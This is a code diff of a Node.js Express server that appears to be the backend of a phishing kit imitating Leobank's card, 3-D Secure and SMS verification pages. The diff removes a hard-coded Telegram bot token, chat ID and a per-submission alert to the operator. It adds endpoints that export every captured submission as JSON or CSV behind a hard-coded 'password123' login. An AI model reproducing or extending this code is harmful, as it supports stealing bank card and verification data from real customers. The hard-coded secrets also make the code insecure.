@@ -6,9 +6,8 @@ const FileSync       = require('lowdb/adapters/FileSync');
 const ShortUniqueId  = require('short-unique-id');
 const axios          = require('axios');
 
-// ✅ Telegram bilgileri
-const token  = '8191580694:AAG7EnTXoERSTuuuY381HK7ExtJyB2T8IxUE';        // ← kendi tokenin
-const chatId = '-4728131788';          // ← kendi chat id'in
+
+
 
 process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));
 process.on('uncaughtException', (e) => console.error('uncaughtException', e));
@@ -63,14 +62,8 @@ app.post('/submit-form', async (req, res) => {
     return res.redirect('/leobank-3ds.html');
   }
 
-   try {
-   await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-       chat_id: chatId,
-       text: `💳 Yeni Başvuru`
-     });
-       } catch (err) {
-     console.error('Telegram HATA:', err.message);
-   }
+  
+
 
   res.redirect(`/sms.html?trans_id=${newId}`);
 });
@@ -102,6 +95,36 @@ app.get('/logout', (req, res) => {
   res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
   res.status(401).send('Çıkış yapıldı');
 });
+const { Parser } = require('json2csv');
+const fs = require('fs');
+
+// JSON export
+app.get('/export/json',
+  basicAuth({ users: { admin: 'password123' }, challenge: true }),
+  (req, res) => {
+    const submissions = db.get('submissions').value();
+    res.setHeader('Content-Disposition', 'attachment; filename=submissions.json');
+    res.setHeader('Content-Type', 'application/json');
+    res.send(JSON.stringify(submissions, null, 2));
+  }
+);
+
+// CSV export
+app.get('/export/csv',
+  basicAuth({ users: { admin: 'password123' }, challenge: true }),
+  (req, res) => {
+    const submissions = db.get('submissions').value();
+    try {
+      const parser = new Parser();
+      const csv = parser.parse(submissions);
+      res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
+      res.setHeader('Content-Type', 'text/csv');
+      res.send(csv);
+    } catch (err) {
+      res.status(500).send('CSV dönüştürme hatası: ' + err.message);
+    }
+  }
+);
 
 // 🌐 Sunucu başlat
 const PORT = 3000;
